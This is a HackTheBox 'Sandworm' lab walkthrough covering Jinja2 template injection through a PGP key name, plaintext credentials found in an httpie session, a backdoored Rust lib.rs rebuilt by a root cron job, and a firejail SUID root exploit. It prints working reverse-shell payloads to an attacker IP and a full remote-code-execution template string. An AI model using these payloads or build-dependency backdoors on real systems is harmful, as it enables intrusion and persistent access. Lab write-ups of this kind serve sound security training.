# HackTheBox — Sandworm

![OS: Linux](https://img.shields.io/badge/OS-Linux-blue)
![Difficulty: Medium](https://img.shields.io/badge/Difficulty-Medium-yellow)
![Tags: ssti, pgp, firejail, rust](https://img.shields.io/badge/Tags-SSTI%20%7C%20PGP%20%7C%20firejail%20%7C%20Rust-orange)

> **TL;DR** — A Flask app verifies PGP signatures and renders the signing key's UID through a Jinja2 template. Inject SSTI via the **Name** field of a generated PGP key for RCE as `atlas` inside a **firejail** sandbox. Find `silentobserver`'s creds in an `httpie` session file. Pivot back to a *non-sandboxed* `atlas` by writing a reverse shell into `lib.rs`, a Rust crate compiled and re-built every two minutes by a root cron job. Finally, escape to root with a **firejail SUID exploit**.

---

## Attack Chain at a Glance

```
nmap → SSTI via PGP UID → atlas (firejail) → silentobserver creds in httpie
   → SSH as silentobserver → user.txt
   → poison lib.rs → atlas (unjailed) → firejail SUID exploit → root.txt
```

---

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [Initial Foothold — SSTI via PGP](#initial-foothold--ssti-via-pgp)
- [User Flag — silentobserver](#user-flag--silentobserver)
- [Pivot — Escaping the Sandbox via lib.rs](#pivot--escaping-the-sandbox-via-librs)
- [Privilege Escalation — Firejail SUID Exploit](#privilege-escalation--firejail-suid-exploit)
- [Root Flag](#root-flag)
- [Lessons Learned](#lessons-learned)
- [Tools Referenced](#tools-referenced)

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sSCV -p- --min-rate=5000 -oN nmap.txt 10.129.182.254
```

<details>
<summary>Click to expand full output</summary>

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-title: Secret Spy Agency | Secret Security Service
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/...
```

</details>

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 8.9p1 (Ubuntu) |
| 80   | HTTP    | nginx 1.18.0 (redirects to HTTPS) |
| 443  | HTTPS   | nginx 1.18.0 (self-signed cert) |

The cert exposes the hostname `ssa.htb`, so:

```bash
echo "10.129.182.254 ssa.htb" | sudo tee -a /etc/hosts
```

---

## Web Enumeration

### Directory Brute-Force

The `-k` flag skips TLS verification (necessary for the self-signed cert):

```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u https://ssa.htb -k
```

```
/about      (Status: 200) [Size: 5584]
/admin      (Status: 302) [--> /login?next=%2Fadmin]
/contact    (Status: 200) [Size: 3543]
/guide      (Status: 200) [Size: 9043]
/login      (Status: 200) [Size: 4392]
/pgp        (Status: 200) [Size: 3187]
/process    (Status: 405) [Size: 153]
/view       (Status: 302) [--> /login?next=%2Fview]
```

### What's Interesting

Three signals point toward the attack surface:

1. The footer reads **"Powered by Flask"** → Jinja2 templates are likely.
2. `/pgp` exposes a public key, and `/guide` hosts a **PGP signature verifier** UI.
3. The verifier's `scripts.js` POSTs `signed_text` and `public_key` to `/process`:

```javascript
$(".verify-form").submit(function(e) {
    e.preventDefault();
    var signed_text = $("#signed_text").val();
    var public_key  = $("#public_key").val();
    $.ajax({
        type: "POST",
        url: "/process",
        data: { signed_text: signed_text, public_key: public_key },
        success: function(result) { /* ... */ }
    });
});
```

Whatever happens server-side after `/process` returns a result, **that result includes data derived from the user-submitted public key** — specifically, the key's UID (name + email). Flask + user-controlled string rendered into a response = Jinja2 SSTI candidate.

---

## Initial Foothold — SSTI via PGP

### Hypothesis

If the server renders the PGP key's UID into a Jinja2 template after verifying a signature, we can poison the UID at key-generation time. PGP keys let you set an arbitrary "Real name" — a perfect injection point.

### Step 1 — Generate a Key with a Jinja2 Payload as the Name

```bash
gpg --gen-key
# Real name:    {{4*4}}
# Email address: a@a.net
```

```
pub   rsa3072 2023-06-30 [SC] [expires: 2025-06-29]
      55CF50DBBD82991B17B5C027020AEF7A1D6044A3
uid                      {{4*4}} <a@a.net>
```

### Step 2 — Export the Public Key

```bash
gpg --export -a 020AEF7A1D6044A3
```

### Step 3 — Sign an Arbitrary Message

```bash
echo 'henlo ssa' | gpg --sign --armor --local-user 0x020AEF7A1D6044A3
```

### Step 4 — Submit Both to `/guide`

Paste the signed message and the public key into the verifier. Confirmation that the payload executed:

```
[GNUPG:] GOODSIG 020AEF7A1D6044A3 16
gpg: Good signature from "16 <a@a.net>"
```

`{{4*4}}` rendered as `16`. **SSTI confirmed.**

> 💡 **Why this works:** The `gpg --verify` output includes the signing key's UID. The app pipes that string into a Jinja2 template (probably with `{{ user_input | safe }}` or equivalent). PGP's UID field accepts arbitrary text — the perfect tunnel for template syntax.

### Step 5 — Upgrade to RCE

A reliable Jinja2 RCE primitive (via [Exploit Notes](https://exploit-notes.hdks.org/exploit/web/framework/python/flask-jinja2-pentesting/)):

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('CMD').read() }}
```

Wrapping a reverse shell directly inside `popen()` is fragile because of quote nesting and special characters. Encode the command in base64 and decode it on the target:

```bash
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.33/1337 0>&1"' | base64
# YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMy8xMzM3IDA+JjEiCg==
```

Final payload (use as the **Name** when generating a new PGP key):

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMy8xMzM3IDA+JjEiCg== | base64 -d | bash').read() }}
```

Repeat steps 1–4 with the new key, listener up:

```bash
nc -lvnp 1337
```

Shell drops in as `atlas` — **not** `www-data`, which is the first hint we're inside a sandbox of some kind:

```
$ id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)
```

---

## User Flag — silentobserver

### Sandbox Signs

Inside the shell, `~/.config/firejail/` immediately gives the game away:

> **firejail** is a SUID sandbox that uses Linux namespaces, seccomp-bpf, and capabilities to confine processes. — [github.com/netblue30/firejail](https://github.com/netblue30/firejail)

Symptoms confirming we're jailed:

- Read-only filesystem in places we'd want to write (no `~/.ssh/authorized_keys` persistence).
- Can't enumerate SUID binaries normally.
- `which firejail` doesn't help — version info is hidden.

### Hunting for Creds in Config Files

`/etc/passwd` shows a second human user, `silentobserver`, with `/bin/bash`. Worth pivoting to.

Browsing config directories for cached secrets pays off — `httpie` keeps session files in plaintext:

```bash
cat ~/.config/httpie/sessions/localhost_5000/admin.json
```

```json
{
    "auth": {
        "password": "quietLiketheWind22",
        "type": null,
        "username": "silentobserver"
    }
}
```

> 💡 **Lesson:** API testing tools (`httpie`, `Insomnia`, Postman exports, `.netrc`, `.curlrc`) routinely store credentials in plaintext in user config dirs. Always grep `~/.config`, `~/.local/share`, and dotfiles in any user's home.

### SSH In

```bash
ssh silentobserver@ssa.htb
# password: quietLiketheWind22

silentobserver@sandworm:~$ cat user.txt
```

🚩 **User flag captured.**

---

## Pivot — Escaping the Sandbox via lib.rs

### Mapping the Privesc Surface

`silentobserver` doesn't have `sudo` rights and no obvious cron jobs. SUID enumeration turns up something unusual under `/opt`:

```bash
find / -type f -perm /4000 -exec ls -la {} \; 2>/dev/null
```

```
-rwsrwxr-x 2 atlas atlas 59047248 /opt/tipnet/target/debug/tipnet
-rwsrwxr-x 2 atlas atlas 59047248 /opt/tipnet/target/debug/deps/tipnet-*
-rwsr-x--- 1 root jailer  1777952 /usr/local/bin/firejail
... (standard ones omitted)
```

A SUID binary owned by `atlas`, in a Rust project directory. That's our way back to `atlas` — but this time, hopefully outside the sandbox.

### Watching root with pspy

Drop [`pspy64`](https://github.com/DominicBreuker/pspy) on the box and let it run:

<details>
<summary>Click to expand pspy output (every 2 minutes)</summary>

```
2023/06/30 23:30:01 UID=0    /usr/sbin/CRON -f -P
2023/06/30 23:30:01 UID=0    /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
2023/06/30 23:30:01 UID=0    /bin/sudo -u atlas /usr/bin/cargo run --offline
2023/06/30 23:30:01 UID=1000 rustc -vV
2023/06/30 23:30:01 UID=1000 rustc - --crate-name ___ ... (compilation)
2023/06/30 23:30:11 UID=0    /bin/rm -r /opt/crates
2023/06/30 23:30:11 UID=0    /bin/bash /root/Cleanup/clean_c.sh
2023/06/30 23:30:11 UID=0    /usr/bin/chmod u+s /opt/tipnet/target/debug/tipnet
```

</details>

Decoded, the cron job:

1. `cd /opt/tipnet` and run `cargo run --offline` as `atlas`.
2. Compile the project (which pulls in source from `/opt/crates/...`).
3. Wipe `/opt/crates` and run a cleanup script.
4. `chmod u+s` the resulting `tipnet` binary.

### Reading the Source

The dependency manifest tells us where the source lives:

```bash
cat /opt/tipnet/target/debug/tipnet.d
# /opt/tipnet/target/debug/tipnet: /opt/crates/logger/src/lib.rs /opt/tipnet/src/main.rs
```

Permission check:

```bash
ls -la /opt/tipnet/src/main.rs            # -rwxr-xr-- root atlas  (read only)
ls -la /opt/crates/logger/src/lib.rs      # -rw-rw-r-- atlas silentobserver  (writable!)
```

`main.rs` contains hardcoded MySQL creds — but that's a rabbit hole (we can connect, but the schema is locked down).

The real prize is `lib.rs`: **we can write to it, and root re-compiles it as `atlas` every two minutes.**

### Poisoning the Crate

Set up a listener on a fresh port:

```bash
nc -lvnp 1337
```

Then, inside the **two-minute window after `/opt/crates` is wiped and before it's rebuilt**, drop a malicious `lib.rs`:

```rust
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;
use std::process::{Command, Stdio};

pub fn log(user: &str, query: &str, justification: &str) {
    let command = "bash -i >& /dev/tcp/10.10.14.33/1337 0>&1";

    let _ = Command::new("bash")
        .arg("-c")
        .arg(command)
        .stdin(Stdio::inherit())
        .stdout(Stdio::inherit())
        .stderr(Stdio::inherit())
        .output();

    // (original logging logic preserved below so cargo doesn't bail on type errors)
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n",
                              timestamp, user, query, justification);

    if let Ok(mut file) = OpenOptions::new().append(true).create(true)
                            .open("/opt/tipnet/access.log") {
        let _ = file.write_all(log_message.as_bytes());
    }
}
```

> ⚠️ **Timing matters.** The cleanup script wipes `/opt/crates` every cycle, so the directory only exists for a short window. Pre-stage the file content somewhere readable and `cp` (or paste into `vim`) the moment the directory reappears.

When cargo runs `cargo run --offline` on the next tick, our `log()` function executes inside the `tipnet` binary running as `atlas` — but **this `atlas` is spawned by a root cron job, not by the firejail-confined webapp**, so we land outside the sandbox.

### Persisting Access

Now that we have a real `atlas` shell, lock in proper SSH access:

```bash
echo 'ssh-rsa AAAA...your-key-here...' >> ~/.ssh/authorized_keys
```

```bash
# from attacker
ssh atlas@ssa.htb
```

Open a second SSH session in another terminal — the next stage needs two shells.

---

## Privilege Escalation — Firejail SUID Exploit

`firejail` is itself SUID-root (`-rwsr-x--- root jailer` on `/usr/local/bin/firejail`), and the version on this box is vulnerable to a SUID-bit local privilege escalation. PoC: [GugSaas firejail SUID gist](https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25).

### Running the Exploit

In **terminal 1** (atlas), drop the PoC and run it:

```bash
nano exploit.py     # paste contents
chmod +x exploit.py
python3 exploit.py
```

```
You can now run 'firejail --join=42528' in another terminal
to obtain a shell where 'sudo su -' should grant you a root shell.
```

In **terminal 2** (atlas), join the spawned namespace:

```bash
atlas@sandworm:~$ firejail --join=42528
changing root to /proc/42528/root
Child process initialized in 8.53 ms

atlas@sandworm:~$ su -
root@sandworm:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Root Flag

```bash
root@sandworm:~# cat /root/root.txt
```

🚩 **Root flag captured.**

---

## Lessons Learned

- **Identify the template engine, then look for places it ingests user-controlled strings indirectly.** SSTI via PGP UIDs is a sneaky variant — the user input traverses `gpg` first, but eventually lands in the template anyway.
- **Encode reverse shells in base64.** Quote-nesting and shell metacharacters break payloads in surprising places (Jinja2 strings, JSON forms, URL parameters). `echo … | base64 -d | bash` is a reliable wrapper.
- **Always grep `~/.config` and dotfiles for credentials.** API clients (`httpie`, `aws`, `gh`, `kube`), database tools, and editors routinely cache secrets.
- **Writable source files compiled by privileged processes are gold.** This box's chain (`silentobserver` → write `lib.rs` → compiled by root-spawned `cargo` running as `atlas`) is a clean example of a build-pipeline-as-attack-surface.
- **`pspy` makes invisible chains visible.** A two-minute cron loop that wipes its working dir would be nearly impossible to spot via filesystem inspection alone.
- **Treat unexpected initial-shell users as a clue.** Landing as `atlas` instead of `www-data` was the first hint that a sandbox was in play.

---

## Tools Referenced

| Tool | Purpose |
|------|---------|
| [`nmap`](https://nmap.org/) | Port and service discovery |
| [`gobuster`](https://github.com/OJ/gobuster) | Directory brute-forcing (HTTPS via `-k`) |
| [`gpg`](https://gnupg.org/) | Crafting PGP keys with payload UIDs |
| [PayloadsAllTheThings — SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) | Jinja2 detection and exploitation payloads |
| [Exploit Notes — Flask/Jinja2](https://exploit-notes.hdks.org/exploit/web/framework/python/flask-jinja2-pentesting/) | RCE primitive used as the SSTI payload |
| [`pspy`](https://github.com/DominicBreuker/pspy) | Process monitoring without root |
| [Firejail SUID PoC](https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25) | Final root escalation |

---

*Thanks for reading — feedback welcome.*
